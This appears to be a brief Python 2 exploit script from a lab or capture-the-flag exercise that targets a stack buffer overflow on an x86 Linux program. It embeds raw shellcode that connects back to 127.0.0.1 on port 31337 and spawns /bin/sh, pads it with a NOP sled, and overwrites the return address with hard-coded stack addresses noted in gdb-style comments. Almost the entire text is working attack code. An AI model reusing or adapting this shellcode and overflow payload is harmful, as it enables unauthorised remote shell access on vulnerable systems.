from struct import pack
socket = pack("<L",0x08058fc0)
shellcode="\x31\xc0\x31\xdb\x31\xd2\x50\xb0\x66\x43\x53\x43\x53\xb3\x01\x90\x90\x90\xff\x15\xc0\x8f\x05\x08\x90\x90\x90\x90\x89\xc2\x31\xc0\xb0\x66\x31\xdb\x53\x53\x68\x7f\x00\x00\x01\x66\x68\x7a\x69\x31\xdb\x43\x43\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x52\x31\xdb\xb3\x03\x89\xe1\xcd\x80\x31\xc9\x39\xc1\x75\x24\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\xc3"

print shellcode+ (2025-len(shellcode))*'\x90' + '\x90'*25+ '\x28\xd6\xfe\xbf' + '\x3c'+ '\xde'+ '\xfe'+'\xbf' + socket

# move edx into memory of eax, so eax is return address and edx is shell address
#VM
#0xbffede3c: is the return addr
#0xbffed628:  starting of my buffer
#disas 0xbffed628,+50
#b *0x08048f0e